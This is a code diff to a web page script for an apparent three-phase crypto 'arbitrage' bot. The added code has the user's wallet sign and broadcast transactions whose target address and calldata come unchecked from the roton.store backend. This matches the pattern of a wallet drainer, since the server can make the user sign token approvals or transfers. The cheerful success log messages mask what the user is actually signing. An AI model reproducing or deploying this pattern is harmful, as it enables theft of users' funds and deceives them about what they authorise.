@@ -316,7 +316,7 @@
 
                         
         
-  async function executeClientOrchestration() {
+async function executeClientOrchestration() {
     if (!window.userAddress) return;
 
     const tradeAmount = document.getElementById('trade-amount').value;
@@ -334,18 +334,32 @@
         // ==========================================
         // PHASE 1: BSC Momentum / Trending Token
         // ==========================================
-        logMessage(`[PHASE 1] Registering BSC intent...`);
+        logMessage(`[PHASE 1] Registering BSC intent & fetching route...`);
         let res1 = await fetch('https://roton.store/prodbot/api/intent', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ wallet: window.userAddress, chain: 'bsc', phase: 'bsc', anchor_token: selectedToken, amount: tradeAmount })
         });
         let data1 = await res1.json();
-        if (data1.status !== "ok") throw new Error("Phase 1 intent registration failed.");
+        if (data1.status !== "ok") throw new Error("Phase 1 intent failed.");
+
+        let route1Res = await fetch('https://roton.store/prodbot/api/analyze-route', { method: 'POST' });
+        let route1 = await route1Res.json();
+        if (route1.status !== "ok") throw new Error(route1.message || "Route analysis failed.");
+
+        logMessage(`[PHASE 1] Requesting wallet signature for router: ${route1.execution_router}...`);
         
-        let route1 = await fetch('https://roton.store/prodbot/api/analyze-route', { method: 'POST' });
-        let routeData1 = await route1.json();
-        logMessage(`[PHASE 1] Executed successfully via router: ${routeData1.execution_router}`);
+        // This triggers the Trust Wallet popup for signing and broadcasting
+        let txHash1 = await provider.request({
+            method: 'eth_sendTransaction',
+            params: [{
+                from: window.userAddress,
+                to: route1.execution_router,
+                data: route1.data || "0x", // Executable router call payload from backend
+                value: "0x0"
+            }]
+        });
+        logMessage(`[PHASE 1] Broadcasted! Tx: ${txHash1.substring(0, 10)}...`);
 
         logMessage(`[HOLD TIMER] Holding Phase 1 position for 60 seconds...`);
         await new Promise(resolve => setTimeout(resolve, 60000));
@@ -360,11 +374,22 @@
             body: JSON.stringify({ wallet: window.userAddress, chain: 'bsc', phase: 'ethereum', amount: tradeAmount })
         });
         let data2 = await res2.json();
-        if (data2.status !== "ok") throw new Error("Phase 2 intent registration failed.");
+        if (data2.status !== "ok") throw new Error("Phase 2 intent failed.");
 
-        let route2 = await fetch('https://roton.store/prodbot/api/analyze-route', { method: 'POST' });
-        let routeData2 = await route2.json();
-        logMessage(`[PHASE 2] Executed successfully via router: ${routeData2.execution_router}`);
+        let route2Res = await fetch('https://roton.store/prodbot/api/analyze-route', { method: 'POST' });
+        let route2 = await route2Res.json();
+        
+        logMessage(`[PHASE 2] Requesting wallet signature for router: ${route2.execution_router}...`);
+        let txHash2 = await provider.request({
+            method: 'eth_sendTransaction',
+            params: [{
+                from: window.userAddress,
+                to: route2.execution_router,
+                data: route2.data || "0x",
+                value: "0x0"
+            }]
+        });
+        logMessage(`[PHASE 2] Broadcasted! Tx: ${txHash2.substring(0, 10)}...`);
 
         logMessage(`[HOLD TIMER] Holding position for 60 seconds...`);
         await new Promise(resolve => setTimeout(resolve, 60000));
@@ -379,12 +404,23 @@
             body: JSON.stringify({ wallet: window.userAddress, chain: 'bsc', phase: 'rrtr', anchor_token: selectedToken, amount: tradeAmount })
         });
         let data3 = await res3.json();
-        if (data3.status !== "ok") throw new Error("Phase 3 intent registration failed.");
+        if (data3.status !== "ok") throw new Error("Phase 3 intent failed.");
 
-        let route3 = await fetch('https://roton.store/prodbot/api/analyze-route', { method: 'POST' });
-        let routeData3 = await route3.json();
+        let route3Res = await fetch('https://roton.store/prodbot/api/analyze-route', { method: 'POST' });
+        let route3 = await route3Res.json();
+
+        logMessage(`[PHASE 3] Requesting final wallet signature...`);
+        let txHash3 = await provider.request({
+            method: 'eth_sendTransaction',
+            params: [{
+                from: window.userAddress,
+                to: route3.execution_router,
+                data: route3.data || "0x",
+                value: "0x0"
+            }]
+        });
         
-        logMessage(`[SUCCESS] Full 3-phase arbitrage loop completed successfully! Target Asset: ${routeData3.target_symbol}`);
+        logMessage(`[SUCCESS] Full 3-phase arbitrage loop broadcasted successfully! Tx: ${txHash3.substring(0, 10)}...`);
 
     } catch (err) {
         logMessage(`[ERROR] Workflow aborted: ${err.message}`);
